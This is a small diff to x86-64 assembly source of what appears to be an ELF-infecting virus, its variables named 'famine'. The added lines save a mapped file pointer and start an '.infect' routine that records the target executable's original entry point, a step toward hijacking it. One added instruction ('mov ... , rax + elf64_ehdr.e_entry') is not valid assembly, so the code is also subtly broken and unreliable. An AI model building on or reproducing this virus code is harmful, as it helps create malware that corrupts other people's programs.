@@ -129,7 +129,10 @@ section .text
                 syscall
                 test rax, rax
                 jle .close_file
+                mov VAR(famine.mmap_pointer), rax 
 
+            .infect:
+                mov VAR(famine.original_entry), rax + elf64_ehdr.e_entry
 
             .close_file:
                 mov rdi, VAR(famine.fd_file)
